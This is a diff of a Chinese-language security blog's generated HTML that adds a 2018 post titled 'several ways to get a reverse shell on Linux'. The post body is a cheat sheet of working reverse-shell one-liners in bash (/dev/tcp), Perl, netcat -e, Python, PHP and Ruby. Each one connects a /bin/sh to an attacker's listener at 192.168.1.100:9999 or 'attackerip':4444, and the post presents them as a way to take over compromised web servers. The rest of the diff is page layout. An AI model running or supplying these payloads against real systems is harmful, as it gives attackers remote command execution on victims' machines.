@@ -9,7 +9,7 @@
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
-    <title>ZclusLLoye&#39;s Blog</title>
+    <title>Linux下反弹shell的几种方法 · ZclusLLoye&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -251,14 +251,23 @@
 </head>
 
     
-        <body class="home-body">
+        <body class="post-body">
     
     
-<header class="header index-header">
+<header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >ZclusLLoye&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Linux下反弹shell的几种方法</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>ZclusLLoye's Blog</a>
 </header>
@@ -277,17 +286,17 @@ height:50vh;
     <!-- 主页  -->
     
     
-    <!-- 文章页  -->
+    <!-- 404页  -->
             
-    <div class="site-intro-img" style="background-image: url(/intro/index-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-placeholder"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            ZclusLLoye's Blog
-            <!-- 文章页  -->
+            Linux下反弹shell的几种方法
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
@@ -295,204 +304,89 @@ height:50vh;
             <!-- 主页副标题  -->
             
             
-                Facing the ideal and the reality.
-            
-            <!-- 文章页  -->
+            <!-- 404 -->
             
         </p>
         <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = linux>linux</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/05/28</span>
+                
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe602;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                    <span class="shareText">Share</span>
+                    <ul class="shareList">
+                        <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                            <div class="share-qrcode"></div>
+                        </li>
+                        <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                        <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                        <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                        <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                    </ul>
+                </span>
+            </div>
         
     </div>
 </div>
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
 
         <div class="container container-unloaded">
-            <main class="main index-page">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在服务器基本上都是采用linux系统，做为一条web狗，最希望当然是拿到网站的webshell，之前看到过几种方法，在这里总结一下吧。<br>这里攻击端的ip为192.168.1.100,并且执行了<code>nc -lvvp 9999</code>，在9999端口进行监听。</p>
+<h1 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h1><p>bash是linux最基本的东西，用bash来反弹shell是必须要清楚的。<br>    <code>bash -i &gt;&amp; /dev/tcp/192.168.1.100/9999 0&gt;&amp;1</code><br>这里的可选择的协议还有udp，但是一般采用的tcp协议。<br>这里的第一个&gt;&amp;是表示shell在后台运行。</p>
+<h1 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h1><p>perl解释器在linux下基本也是预装的，但如今似乎用的人越来越少了，剩下它的正则表达式还在延续。<br>    <code>perl -e &#39;use Socket;$i=&quot;192.168.1.100&quot;;$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code></p>
+<h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><p>nc命令在linux下也是常见的，不过docker里一般不会有nc。<br>    <code>nc -e /bin/sh 192.168.1.100 9999</code><br>-e代表程序重定向 将/bin/sh 重定向到远程端口</p>
+<h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><p>现在用python写后端的人也挺多的，有命令注入的话说不定可以直接搞事。<br>    <code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.100&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p>
+<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>php是世界上最好的语言！<br>    <code>php -r &#39;$sock=fsockopen(&quot;192.168.1.100&quot;,9999);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
+<h1 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h1><p>还记得之前某位老师说过Ruby会比python更火，然而现在身边会Ruby的人好像没多少。<br><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code><br>还有不依赖/bin/sh的shell<br><code>ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code><br>顺带一提如果在windows上要用Ruby反弹shell，则<br><code>ruby -rsocket -e &#39;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code><br>不过我想我可能永远用不上。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>lua现在都没看见了，在这里便不列出来了。通常都是nc，python，php，bash用的较多一点。好像php的shell还有另一种形式，记性太差，想不起来了。之后再补上。</p>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/05/11/selectsort/" title= 经典算法之选择排序 >
+                    <div class="prevTitle">经典算法之选择排序</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
     
+    <!--PC版-->
+
+    <!--PC版-->
+
+
     
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/03/10/maze/" >
-                
-                    <span>使用递归算法解决迷宫问题</span>
-            </a>
-            <div class="abstract-content">
-                最近看递归的问题有点多，也逐渐有了自己的想法和思路。对于递归问题，其实让人不理解的无非是它的逻辑思路，遇到不理解的地方在纸上写写逻辑，问题就迎刃而解了。
-代码部分12345678910111213141516171819202122232425262728293031323334353637383940414243444546474...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/03/10</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = 算法>算法</a>
-    
-</div>
-                
-            </div>
-        </article>
-    
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/03/10/resolve-number/" >
-                
-                    <span>实现整数的所有划分数</span>
-            </a>
-            <div class="abstract-content">
-                本来以为已经弃C语言的坑了，没想到因为课程原因开始学习算法了= =！还是不得不感叹时间飞逝，从开始只会写简单小程序到现在会使用简单算法的程序，想想半年前刚入协会的时候我连一个循环都写不出来….
-说正事= =!第一个算法案例就是递归问题：利用递归来实现整数的划分数，并输出结果。自己也想了很久，网上也找了几份源码，对自己现在写的不是很满...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/03/10</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = 算法>算法</a>
-    
-</div>
-                
-            </div>
-        </article>
-    
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/03/10/talk-about-blog/" >
-                
-                    <span>谈一谈博客</span>
-            </a>
-            <div class="abstract-content">
-                以前就想写博客很久了，理由有很多，不管是记录生活，还是学习上的知识，我觉得都有必要记录下来。身边很多朋友都写文章，但是我并不喜欢，也不习惯去写东西。
-然而，对于那些成堆的知识，我只能一点一点记忆下来。那时我萌生了写博客记录学习的想法，找了好几家博客但似乎都不符合我的要求，自己建站吧又嫌太麻烦。后来自己也得过且过，也没想过是时候该把自...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/03/10</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = 随笔>随笔</a>
-    
-</div>
-                
-            </div>
-        </article>
-    
-    <!-- paginator  -->
-    
-    <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/">&#60; PREV</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-    </nav>
-    
+    <!-- 评论 -->
 </main>
             <!-- profile -->
-            
-            <div class="profile">
-    <img class="profile-avatar" src= /avatar/1.jpg >
-    <div class="profile-name">ZclusLLoye</div>
-    
-    <div class="profile-signature">
-        耿直的现实主义者/热爱安全的web狗
-    </div>
-    
-    
-    <div class="profile-social">
-        
-    
-        
-            
-                <a href="mailto:zcluslloye@gmail.com" class="iconfont-archer email" title=email ></a>
-            
-        
-    
-        
-            
-                <a href="//github.com/zcluslloye" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
-    
-        
-    
-        
-            
-                <span class="iconfont-archer qq" title=qq>
-                  
-                  <img class="profile-qr" src="/intro/qq.jpg" />
-                </span>
-            
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-            
-                <a href="http://music.163.com/#/user/home?id=511346082" class="iconfont-archer others" target="_blank" title=others></a>
-            
-        
-    
-        
-            
-                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
-            
-        
-    
-        
-    
-
-    </div>
-    
-    
-        <div class="friends">
-            <div>FRIENDS</div>
-            
-                
-                    <span>
-                        <a href= https://li4n0.github.io target="_black">Li4n0</a>
-                    </span>
-                
-            
-                
-                    <span>
-                        <a href= https://blog.csdn.net/qq_40712579 target="_black">wkk</a>
-                    </span>
-                
-            
-        </div>
-    
-    
-        <div class="about-me">
-            <a href = "/about" >ABOUT ME</a>
-        </div>
-    
-</div>
             
         </div>
         <footer class="footer footer-unloaded">
@@ -576,6 +470,22 @@ height:50vh;
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bash"><span class="toc-number">2.</span> <span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Perl"><span class="toc-number">3.</span> <span class="toc-text">Perl</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nc"><span class="toc-number">4.</span> <span class="toc-text">nc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python"><span class="toc-number">5.</span> <span class="toc-text">python</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP"><span class="toc-number">6.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ruby"><span class="toc-number">7.</span> <span class="toc-text">Ruby</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#后记"><span class="toc-number">8.</span> <span class="toc-text">后记</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -857,6 +767,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
     
     </body>
 </html>
